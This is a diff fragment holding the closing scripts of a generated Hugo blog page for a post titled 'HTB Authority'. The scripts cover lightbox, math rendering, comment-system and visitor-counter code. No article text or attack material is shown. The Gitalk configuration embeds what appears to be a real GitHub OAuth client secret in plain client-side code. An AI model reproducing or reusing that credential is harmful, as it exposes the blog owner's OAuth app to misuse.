+    deferintegrity="sha384-aagKMe8nkqaP2DYQc8kkYOL5l&#43;M5Q2WH/Uhr4teOh0Ybp0RZj0kUSDm45qPikMjK" crossorigin="anonymous"></script><script src="/js/algolia_search.js" ></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+    if (window.firework) {
+      const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+      options.excludeElements = options.excludeelements;
+      delete options.excludeelements;
+      window.firework(options);
+    }
+  }
+</script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Ya1orin",
+          title: "HTB Authority",
+          url: "http:\/\/localhost:1313\/post\/htb-authority\/",
+          description: "HackTheBox篇ADCS系列之Authority",
+          cover: "http:\/\/localhost:1313\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script><script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+  var commentConfigKeys = ['valine', 'waline', 'twikoo', 'gitalk', 'giscus'];
+  var commentConfig = {gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/gitalk@1.8.0\/dist\/gitalk.min.js',
+          !'webcache|gitalk@1.8.0\/dist\/gitalk.min.js'.startsWith('local') ? 'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU\/lcEH5O8eVbSDhbPwsiVUTp\/aGX\/z\/5EuMA' : undefined
+        );
+        script.onload = () => {
+          if ( false ) {
+            
+            const md5Script = loadScript(
+              'https:\/\/npm.webcache.cn\/blueimp-md5@2.19.0\/js\/md5.min.js',
+              !'webcache|blueimp-md5@2.19.0\/js\/md5.min.js'.startsWith('local') ? 'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr\/gZlbkHkL6vTthxH' : undefined
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            
+            initGitalk();
+          }
+        };
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          let gitalk = new Gitalk({
+            clientID: 'Ov23li64Bz4egFDpBVAa',
+            clientSecret: 'ff0e7ea9d99ed40adbfcb4bf88ff2b95918d9dd7',
+            repo: 'Blog-comment',
+            owner: 'Ya1orin',
+            admin: JSON.parse("\"Ya1orin\""),
+            id: location.pathname,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          });
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },};
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig?.[key]?.enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      var configDefault = 'gitalk';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig?.[sys]?.enable) || '';
+    }
+  }
+
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      
+      const commentType = item.getAttribute('data-selector');
+
+      
+      hideAllComments();
+
+      
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          
+          changeActiveCommentItems(item);
+        });
+      }
+
+      
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js"
+    data-pjaxintegrity="sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC&#43;gqPB3IBNO35xjZK3Ejb6oONRpDbPg" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js"
+    data-pjaxintegrity="sha384-hCXGrW6PitJEwbkoStFjeJxv&#43;fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script><script data-pjax>
+          var renderMath = () => {
+            if (!window.renderMathInElement) return;
+            window.renderMathInElement(_$("article"), {
+              delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "\\[", right: "\\]", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+              ],
+            });
+          };
+          if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", renderMath, { once: true });
+          } else {
+            renderMath();
+          }
+        </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
